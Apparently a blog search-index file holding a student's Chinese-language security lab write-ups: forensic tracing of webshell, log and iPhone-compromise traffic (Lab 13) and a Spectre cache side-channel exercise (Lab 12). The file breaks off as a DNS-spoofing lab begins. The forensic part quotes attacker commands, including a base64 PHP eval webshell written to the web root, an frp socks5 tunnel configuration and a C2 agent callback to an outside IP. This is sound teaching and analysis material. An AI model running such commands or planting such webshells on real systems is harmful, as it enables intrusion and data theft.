<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>finally</title>
    <link href="/2024/12/26/finally/"/>
    <url>/2024/12/26/finally/</url>
    
    <content type="html"><![CDATA[<p>终于把想放上去的作业放完了。。为什么这么无聊还不复习！</p>]]></content>
    
    
    
    <tags>
      
      <tag>boring</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 13</title>
    <link href="/2024/12/25/lab13/"/>
    <url>/2024/12/25/lab13/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="Lab-13-溯源与取证分析实验"><a href="#Lab-13-溯源与取证分析实验" class="headerlink" title="Lab 13-溯源与取证分析实验"></a>Lab 13-溯源与取证分析实验</h1><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>溯源取证分析作为网络攻防过程中重要环节，准确找到攻击者的入侵线索(尤其是攻击突破口、攻击IP地址、域名、工具等信息)，对于企业或者团队安全运营团队来说都是必备技能。常规攻击取证过程中往往会结合流量、Web访问日志、终端系统或者软件日志等信息来挖掘或者推断相关线索。本实验通过网络流量、日志等溯源环境进行真实案例模仿，通过实战化分析来锻炼学生的取证溯源能力，从而加深大家对于网络攻防的实战化水平。在本实验结束时，学生应该能够具备对网络流量和日志的基本分析能力。</p><hr><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="Task1-Webshell数据包-webshell-zip"><a href="#Task1-Webshell数据包-webshell-zip" class="headerlink" title="Task1 Webshell数据包(webshell.zip)"></a>Task1 Webshell数据包(webshell.zip)</h4><p>小张单位网站被黑客挂马，请从流量中分析出webshell，并进行回答：</p><p>A.  黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。</p><p>B.  黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。</p><ol><li><p>搜索login，在No.101发现很轻易就拿到了输入的用户名和密码</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223022846820.png" alt="image-20241223022846820"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223022908352.png" alt="image-20241223022908352"></p></li><li><p>因为知道是用了webshell攻击，所以肯定是执行了system命令的，搜了一下发现了返回’a’</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223031231788.png" alt="image-20241223031231788"></p></li><li><p>但是后面的system对应的参数都是aaa，执行了下述这些命令</p><ol><li><p>system(‘whoami’);  </p><p>获取当前程序运行的用户<img src="https://gitee.com/r0otsu/images/raw/master/image-20241223031404712.png" alt="image-20241223031404712"></p></li><li><p>system(‘ipconfig’);</p><p>显示当前计算机的网络配置信息<img src="https://gitee.com/r0otsu/images/raw/master/image-20241223031516345.png" alt="image-20241223031516345"></p></li><li><p>system(‘pwd’);</p><p>显示当前工作目录</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223031617340.png" alt="image-20241223031617340"></p></li><li><p>system(‘echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYWFhXSk7Pz4&#x3D;|base64 -d’);</p><p>将这段字符串用base64解码后，发现为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这是一个明显的恶意代码，若写入web服务器的php文件后，可以用蚁剑连接拿到shell</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223031834107.png" alt="image-20241223031834107"></p></li><li><p>system(‘echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYWFhXSk7Pz4&#x3D;|base64 -d &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;1.php’);</p><p>果然，这里就执行了</p><p>在web服务器的 <code>/var/www/html</code> 目录下生成了一个文件 <code>1.php</code>，内容为上述的恶意代码</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223031949636.png" alt="image-20241223031949636"></p></li></ol></li><li><p>继续跟踪<code>aaa</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223033942774.png" alt="image-20241223033942774"></p><ol><li><p>第一个item可以看出是明显的蚁剑连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asenc</span>(<span class="hljs-params"><span class="hljs-variable">$out</span></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;&#125;;.....<br></code></pre></td></tr></table></figure></li><li><p>第二个item中的值进行base64解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-keyword">var</span>/www/html/frpc.ini<br></code></pre></td></tr></table></figure><p>表示将路径 <code>/var/www/html/frpc.ini</code> 作为表单数据提交，即 将<code>frpc.ini</code>文件上传到服务器上，<font color='green'>攻击者能够通过这个文件访问服务器内的资源</font></p></li><li><p>第三个item中的值进行解析，这是一个ASCII编码，解码后得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">[common]<br>server_addr = <span class="hljs-number">192.168</span>.<span class="hljs-number">239.123</span><br>server_port = <span class="hljs-number">7777</span><br>token = Xa3BJf2l5enmN6Z7A8mv<br><br>[test_sock5]<br>type = tcp<br>remote_port = <span class="hljs-number">8111</span><br>plugin = socks5<br>plugin_user = <span class="hljs-number">0</span>HDFt16cLQJ<br>plugin_passwd = JTN276Gp<br>use_encryption = <span class="hljs-literal">true</span><br>use_compression = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>可以拿到SOCKS5的user和passwd字段</p></li></ol></li></ol><hr><h5 id="A-黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。"><a href="#A-黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。" class="headerlink" title="A.  黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。"></a>A.  黑客在整个过程中做了哪些操作，请简单列举出来并截图说明。</h5><p><font color='red'>（分析过程见上）</font></p><ol><li><p>登录系统</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223022846820.png" alt="image-20241223022846820"></p></li><li><p>写入webshell</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223031949636.png" alt="image-20241223031949636"></p></li><li><p>使用蚁剑进行连接，拿到webshell并进行操作</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223033942774.png" alt="image-20241223033942774"></p></li></ol><hr><h5 id="B-黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。"><a href="#B-黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。" class="headerlink" title="B.  黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。"></a>B.  黑客登录系统使用的密码、黑客的socks5的连接账号与密码请列举出来，并配图说明。</h5><p><font color='red'>（分析过程见上）</font></p><ol><li><p>登录使用的账号、密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">username: test<br>password: Admin123!@#<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223022846820.png" alt="image-20241223022846820"></p></li><li><p>SOCKS5的账号、密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">plugin_user = 0HDFt16cLQJ<br>plugin_passwd = JTN276Gp<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223033942774.png" alt="image-20241223033942774"></p></li></ol><hr><h4 id="Task2-日志分析-日志分析-zip"><a href="#Task2-日志分析-日志分析-zip" class="headerlink" title="Task2 日志分析(日志分析.zip)"></a>Task2 日志分析(日志分析.zip)</h4><p>小明发现单位某应用程序被攻击后提取了对应的日志数据，请分析日志并进行作答：</p><h5 id="A-网络存在源码泄漏，源码文件名是什么？-请提交带有文件后缀的文件名，例如x-txt，并对流量分析进行截图"><a href="#A-网络存在源码泄漏，源码文件名是什么？-请提交带有文件后缀的文件名，例如x-txt，并对流量分析进行截图" class="headerlink" title="A.  网络存在源码泄漏，源码文件名是什么？(请提交带有文件后缀的文件名，例如x.txt，并对流量分析进行截图)"></a>A.  网络存在源码泄漏，<strong>源码文件名是什么</strong>？(请提交带有文件后缀的文件名，例如x.txt，并对流量分析进行截图)</h5><ol><li><p>直接在日志中以状态码200看一下攻击者成功访问了哪些文件</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223041252371.png" alt="image-20241223041252371"></p><p>发现有<code>www.zip</code>，这是网站备份文件，本来不应该是普通用户能够访问的，所以网站应该泄露的就是<code>www.zip</code>文件</p></li></ol><p><strong>网站泄露的是<code>www.zip</code>文件</strong></p><hr><h5 id="B-分析攻击流量，黑客往-tmp目录写入一个文件，文件名是什么？-请对流量分析进行截图"><a href="#B-分析攻击流量，黑客往-tmp目录写入一个文件，文件名是什么？-请对流量分析进行截图" class="headerlink" title="B.  分析攻击流量，黑客往&#x2F;tmp目录写入一个文件，文件名是什么？(请对流量分析进行截图)"></a>B.  分析攻击流量，黑客往&#x2F;tmp目录写入一个文件，<strong>文件名是什么</strong>？(请对流量分析进行截图)</h5><ol><li><p>在日志中搜索’tmp’</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223042154462.png" alt="image-20241223042154462"></p><p>攻击者尝试访问<code>/tmp/sess_car</code>文件，并往其中写入了一段序列化的php代码</p><p>如果服务器对 <code>/tmp/sess_car</code> 文件执行反序列化操作，攻击者可以伪造数据触发 <code>call_user_func_array</code>，调用任意函数</p></li></ol><p><strong>写入的是<code>sess_car</code>文件</strong></p><hr><h5 id="C-分析攻击流量，黑客使用的是什么漏洞读取了秘密文件？"><a href="#C-分析攻击流量，黑客使用的是什么漏洞读取了秘密文件？" class="headerlink" title="C.  分析攻击流量，黑客使用的是什么漏洞读取了秘密文件？"></a>C.  分析攻击流量，黑客使用的是<strong>什么漏洞</strong>读取了秘密文件？</h5><ol><li><p>SplFileObject漏洞，当使用反序列化操作时，可以利用SplFileObject来触发一些安全漏洞</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223043036456.png" alt="image-20241223043036456"></p></li></ol><hr><h4 id="Task3-攻击“苹果”注入-ios-zip"><a href="#Task3-攻击“苹果”注入-ios-zip" class="headerlink" title="Task3 攻击“苹果”注入(ios.zip)"></a>Task3 攻击“苹果”注入(ios.zip)</h4><p>一位苹果安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答：</p><p>A.  简述黑客的整个攻击过程，关键步骤请配图说明。</p><p>B.  黑客所控制的C&amp;C服务器IP是什么？</p><p>C.  被害者手机上被拿走了的私钥文件内容是什么？</p><hr><ol><li><p>在日志中搜索<code>php</code>，发现了<code>ma.php</code>，看起来很明显是一个植入的木马文件</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223044145696.png" alt="image-20241223044145696"></p></li><li><p>第一个访问中有<code>fxxk=system(base64_decode(%27d2hvYW1p%27));</code></p><p>这表示攻击者试图传入fxxk参数，使服务器执行用base64编码后再解码的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>并且已经执行成功了，返回’200’，说明木马植入成功</strong></p></li><li><p>打开pcap文件，发现在第15条tcp流时，<strong>攻击者下载了一个文件<code>Stowaway</code></strong></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223045831809.png" alt="image-20241223045831809"></p><p><code>Stowaway</code>是一个内网穿透工具，能够使攻击者通过这个文件访问用户中的所有文件</p></li><li><p>在这条流中搜索’ios_agent’，发现执行命令<code>ios_agent -c 3.128.156.159:8081 -s hack4sec</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223050139305.png" alt="image-20241223050139305"></p><p>也就是说攻击者主机IP是 <code>3.128.156.159</code>，使用的加密密钥是<code>hack4sec</code></p></li><li><p>文件中的流量被加密了</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223050539615.png" alt="image-20241223050539615"></p></li><li><p>使用实验中给到的<code>keylog.txt</code>密钥文件进行解密</p><p>编辑-&gt;首选项-&gt;Protocols-&gt;TLS-&gt;(Pre)-Master-Secret log filename-&gt;浏览…</p><p>将<code>keylog.txt</code>加载进去</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223052043048.png" alt="image-20241223052043048"></p></li><li><p>筛选出http2流量，发现有明显的sql注入攻击</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223052530023.png" alt="image-20241223052530023"></p><p><strong>确实是布尔注入</strong></p></li><li><p>进行端口扫描，在端口扫描时，大多数端口会显示关闭，返回RST，可以在专家模式中找到RST的最大和最小端口确定端口扫描范围</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223053241979.png" alt="image-20241223053241979"></p></li></ol><hr><h5 id="A-简述黑客的整个攻击过程，关键步骤请配图说明。"><a href="#A-简述黑客的整个攻击过程，关键步骤请配图说明。" class="headerlink" title="A.  简述黑客的整个攻击过程，关键步骤请配图说明。"></a>A.  简述黑客的整个攻击过程，关键步骤请配图说明。</h5><ol><li><p>以3.128.156.159作为C&amp;C服务器，在192.168.1.8安装ios_agent，并执行命令<code>ios_agent -c 3.128.156.159:8081 -s hack4sec</code>控制主机</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223050139305.png" alt="image-20241223050139305"></p></li><li><p>对192.168.1.8进行SQL注入攻击，获取敏感信息</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223052530023.png" alt="image-20241223052530023"></p></li><li><p>进行端口扫描</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223060758895.png" alt="image-20241223060758895"></p></li><li><p>向主机中植入木马，写入webshell</p><p>攻击者试图传入fxxk参数，使服务器执行用base64编码后再解码的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223044145696.png" alt="image-20241223044145696"></p></li></ol><h5 id="B-黑客所控制的C-C服务器IP是什么？"><a href="#B-黑客所控制的C-C服务器IP是什么？" class="headerlink" title="B.  黑客所控制的C&amp;C服务器IP是什么？"></a>B.  黑客所控制的C&amp;C服务器IP是什么？</h5><ol><li><p>从上述可知，执行命令为<code>ios_agent -c 3.128.156.159:8081 -s hack4sec</code>，即攻击者控制的ip为<code>3.128.156.159</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223050139305.png" alt="image-20241223050139305"></p></li></ol><hr><h5 id="C-被害者手机上被拿走了的私钥文件内容是什么？"><a href="#C-被害者手机上被拿走了的私钥文件内容是什么？" class="headerlink" title="C.  被害者手机上被拿走了的私钥文件内容是什么？"></a>C.  被害者手机上被拿走了的私钥文件内容是什么？</h5><ol><li><p><del>通过sql注入命令，可以知道攻击者在一个个尝试密码中的每一个字符。并且黑客遍历每一个字符的顺序为0x2B、0x2D、0x7B、0x7D、0x30……</del></p><p>依次这样分析剩下的所有数据包即可获得所有的16进制值</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">37343635386633206338343120343536642038356437206436633066656461626232<br></code></pre></td></tr></table></figure></li><li><p>解码16进制后得到</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">746558f3-c841-456b-85d7-d6c0f2edabb2<br></code></pre></td></tr></table></figure></li></ol><p>即得到敏感信息为<code>746558f3-c841-456b-85d7-d6c0f2edabb2</code></p><hr><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻防实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 12</title>
    <link href="/2024/12/25/lab12/"/>
    <url>/2024/12/25/lab12/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="Lab-12-幽灵攻击实验"><a href="#Lab-12-幽灵攻击实验" class="headerlink" title="Lab 12-幽灵攻击实验"></a>Lab 12-幽灵攻击实验</h1><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>幽灵攻击于2017年发现，并于2018年1月公开披露，它利用关键漏洞进行攻击，存在于许多现代处理器中，包括Intel、AMD和ARM处理器。漏洞允许程序突破进程间和进程内的隔离，以便恶意程序可以读取来自无法访问区域的数据。硬件保护不允许这样的访问机制（用于进程间的隔离）或软件保护机制（用于进程内的隔离），但CPU设计中存在漏洞，可能会破坏保护。因为缺陷存在于硬件中，很难从根本上解决问题，除非更换CPU。幽灵和熔断漏洞代表了CPU设计中的一种特殊类型的漏洞，它们还为安全教育提供了宝贵的一课。</p><p>本实验的学习目标是让学生获得幽灵攻击的第一手经验。攻击本身非常复杂，因此我们将其分解为几个小步骤，每个步骤都是易于理解和执行。一旦学生理解了每一步，就不难理解了把所有的东西放在一起进行实际的攻击。本实验涵盖了以下内容：</p><ul><li>幽灵攻击</li><li>侧通道攻击</li><li>CPU缓存</li><li>CPU微体系结构内的无序执行和分支预测</li></ul><hr><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>崩溃和幽灵攻击都使用CPU缓存作为一个侧通道来窃取一个受保护的秘密，使用的技术为刷新+重加载。</p><p>当CPU获取数据时，通常先访问CPU Cache，CPU Cache中未找到，再访问主存Main Memory。</p><p>因此，当CPU需要获取数据时，首先查看CPU Cache，如果缓存命中，将直接获取；如果未命中，CPU将进入Main Memory获取数据。CPU Cache会比访问Main Memory快很多。</p><h4 id="Task-1-＆-Task-2-Side-Channel-Attacks-via-CPU-Caches"><a href="#Task-1-＆-Task-2-Side-Channel-Attacks-via-CPU-Caches" class="headerlink" title="Task 1 ＆ Task 2: Side Channel Attacks via CPU Caches"></a>Task 1 ＆ Task 2: Side Channel Attacks via CPU Caches</h4><h5 id="Task-1-Reading-from-Cache-versus-from-Memory"><a href="#Task-1-Reading-from-Cache-versus-from-Memory" class="headerlink" title="Task 1: Reading from Cache versus from Memory"></a>Task 1: Reading from Cache versus from Memory</h5><p>编译<code>CacheTime.c</code>并输出，查看CPU获取不同数据的访问时间，用以得到访问CPU Cache和Main Memory的时间：</p><ol><li>第一次：<img src="https://gitee.com/r0otsu/images/raw/master/image-20241201213350010.png" alt="image-20241201213350010"></li><li>第二次：<img src="https://gitee.com/r0otsu/images/raw/master/image-20241201212725609.png" alt="image-20241201212725609"></li><li>第三次：<img src="https://gitee.com/r0otsu/images/raw/master/image-20241201212756067.png" alt="image-20241201212756067"></li></ol><p><strong>可以初步判定，80次CPU访问时间以内的，大概率是访问CPU Cache；</strong></p><p><strong>而次数较大的，大概率是访问主存。</strong></p><hr><h5 id="Task-2-Using-Cache-as-a-Side-Channel"><a href="#Task-2-Using-Cache-as-a-Side-Channel" class="headerlink" title="Task 2: Using Cache as a Side Channel"></a>Task 2: Using Cache as a Side Channel</h5><p>编译20次<code>FlushReload.c</code>并输出，将CPU Cache中缓存的值读取出来，即该值为victim函数调用的值，因为前面已经确认阈值为<code>80</code>了，所以没有更改<code>FlushReload.c</code>中的阈值：</p><p><font color='red'>（这里只截取5次的结果，都是正确输出）</font></p><ol><li><p>一次：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241201214112994.png" alt="image-20241201214112994"></p></li><li><p>二次：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241201214132312.png" alt="image-20241201214132312"></p></li><li><p>三次：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241201214150322.png" alt="image-20241201214150322"></p></li><li><p>四次：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241201214222526.png" alt="image-20241201214222526"></p></li><li><p>五次：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241201214257609.png" alt="image-20241201214257609"></p></li></ol><p><strong>可以看到都是正确输出94，说明CPU Cache中存入的值为94，即得到Secret的值。</strong></p><hr><h4 id="Task-3-Out-of-Order-Execution-and-Branch-Prediction"><a href="#Task-3-Out-of-Order-Execution-and-Branch-Prediction" class="headerlink" title="Task 3: Out-of-Order Execution and Branch Prediction"></a>Task 3: Out-of-Order Execution and Branch Prediction</h4><ol><li><p>直接编译执行<code>SpectreExperiment.c</code>，模拟在侧通道中可能会有噪声的情况时，即CPU缓存了一些额外的东西，能否获取到Secret的值</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223010144818.png" alt="image-20241223010144818"></p><p><strong>可以看到还是能成功获取的。</strong></p></li><li><p>注释掉以下的代码，会导致CPU的分支预测器不会受到干扰，从而使得侧信道攻击无法成功执行</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223003247787.png" alt="image-20241223003247787"></p></li><li><p>但不知道为什么我编译之后还是可以得到Secret，可能是因为CPU缓存预取机制使得能够探测到缓存状态变化（不太明白）</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223011300912.png" alt="image-20241223011300912"></p></li><li><p>取消注释上述行，修改代码中箭头所指的部分，将传入的值修改为20-29</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223003556480.png" alt="image-20241223003556480"></p></li><li><p>编译执行后，可以看到攻击不成功了</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223011517452.png" alt="image-20241223011517452"></p><p>这是因为把传入的值修改为20-29后，分支语句多次执行false，导致训练的结果是CPU会预测执行false语句，所以没有执行分支</p></li></ol><p><strong>task3完成！</strong></p><hr><h4 id="Task-4-The-Spectre-Attack"><a href="#Task-4-The-Spectre-Attack" class="headerlink" title="Task 4: The Spectre Attack"></a>Task 4: The Spectre Attack</h4><ol><li><p>编译执行<code>SpectreAttack.c</code>，利用分支预测获取Secret值</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223011915490.png" alt="image-20241223011915490"></p><p><strong>可以看到都能正确获得秘密值，攻击成功！</strong></p></li></ol><p><strong>task4完成！</strong></p><hr><h4 id="Task-5-Improve-the-Attack-Accuracy"><a href="#Task-5-Improve-the-Attack-Accuracy" class="headerlink" title="Task 5: Improve the Attack Accuracy"></a>Task 5: Improve the Attack Accuracy</h4><ol><li><p>直接编译执行<code>SpectreAttackImprove.c</code>，发现多次并不能返回正确的值</p><p>第一次：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223012235097.png" alt="image-20241223012235097"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223012301413.png" alt="image-20241223012301413"></p><p>第二次：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223012317997.png" alt="image-20241223012317997"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223012343186.png" alt="image-20241223012343186"></p><p>第三次：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223012357395.png" alt="image-20241223012357395"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223012422555.png" alt="image-20241223012422555"></p><p><font color='green'>都没有返回正确的值</font></p></li><li><p>尝试修改<code>SpectreAttackImprove.c</code>文件，只有当 s 不为零时，才会对数组 array 的特定位置进行修改，即确保只对包含敏感信息的内存位置进行修改，会更容易拿到Secret的值</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223004508672.png" alt="image-20241223004508672"></p></li><li><p>再次编译执行</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223012920731.png" alt="image-20241223012920731"></p><p>结果</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223012948226.png" alt="image-20241223012948226"></p><p><strong>果然拿到了！</strong></p></li><li><p>注释掉这一行，hit的值降低，也会拿不到Secret的值</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223004559378.png" alt="image-20241223004559378"></p></li><li><p>重新编译执行</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223013226717.png" alt="image-20241223013226717"></p><p><strong>发现果然hit的值变小，而且无法拿到Secret的值了</strong></p></li><li><p>修改usleep的值，程序的睡眠时间影响攻击的成功率，可能因为时间变长后，判断语句已经返回结果，不需要进行分支预测，也就无法攻击成功了</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223013544398.png" alt="image-20241223013544398"></p></li><li><p>以下为不同usleep值的运行结果</p><ol><li><p>usleep(100)</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223013812183.png" alt="image-20241223013812183"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223013834608.png" alt="image-20241223013834608"></p><p>攻击成功，可以拿到Secret的值</p></li><li><p>usleep(1000)</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223014028083.png" alt="image-20241223014028083"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223014048501.png" alt="image-20241223014048501"></p><p>攻击成功，可以拿到Secret的值</p></li><li><p>usleep(10000)</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223014147983.png" alt="image-20241223014147983"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223014211331.png" alt="image-20241223014211331"></p><p>攻击成功，可以拿到Secret的值</p></li><li><p>usleep(100000)</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223014534517.png" alt="image-20241223014534517"></p><p><strong>终于攻击失败了</strong></p></li></ol></li></ol><p><strong>task5完成！</strong></p><hr><h4 id="Task-6-Steal-the-Entire-Secret-String"><a href="#Task-6-Steal-the-Entire-Secret-String" class="headerlink" title="Task 6: Steal the Entire Secret String"></a>Task 6: Steal the Entire Secret String</h4><ol><li><p>创建<code>task6.c</code>，用于窃取CPU Cache中的所有值（完整代码见源代码）</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223015027091.png" alt="image-20241223015027091"></p></li><li><p>编译后执行</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223015512903.png" alt="image-20241223015512903"></p></li><li><p>以下是执行几次后的结果</p><ol><li><p>第一次</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223015556729.png" alt="image-20241223015556729"></p><p>输出不完整</p></li><li><p>第二次</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223015631437.png" alt="image-20241223015631437"></p><p>输出不完整</p></li><li><p>第三次</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223015659410.png" alt="image-20241223015659410"></p><p>输出不完整</p></li><li><p>中间几次省略，第七次</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241223015841594.png" alt="image-20241223015841594"></p><p><strong>除了第一个字符其他都完整输出了</strong></p></li></ol></li></ol><p><strong>task6完成！</strong></p><hr><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻防实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 11</title>
    <link href="/2024/12/25/lab11/"/>
    <url>/2024/12/25/lab11/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="Lab-11-DNS欺骗实验"><a href="#Lab-11-DNS欺骗实验" class="headerlink" title="Lab 11-DNS欺骗实验"></a>Lab 11-DNS欺骗实验</h1><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>本实验的目标是让学生获得对DNS（域名系统）的各种攻击的第一手经验。DNS是互联网的电话簿；它将主机名转换为IP地址，反之亦然。这种转换是通过DNS解析实现的，这种解析发生在幕后。DNS欺骗攻击以各种方式操纵此解析过程，目的是将用户误导到其他目的地，这些目的地通常是恶意的。本实验室主要研究几种DNS欺骗攻击技术。学生将首先设置和配置DNS服务器，然后在实验室环境中的目标上尝试各种DNS欺骗攻击。</p><p>第一个大实验任务（本地DNS欺骗）中进行的攻击假设攻击者位于同一本地网络上，因此可以嗅探DNS数据包。这个假设是为了简化实验任务。第二个大实验任务为远程DNS攻击实验，攻击者在没有嗅探数据包的情况下发起远程欺骗攻击，远程攻击实验室比本地DNS欺骗实验更具挑战性。</p><hr><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="Local-DNS-Attack-Lab"><a href="#Local-DNS-Attack-Lab" class="headerlink" title="Local DNS Attack Lab"></a><strong>Local DNS Attack Lab</strong></h4><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" 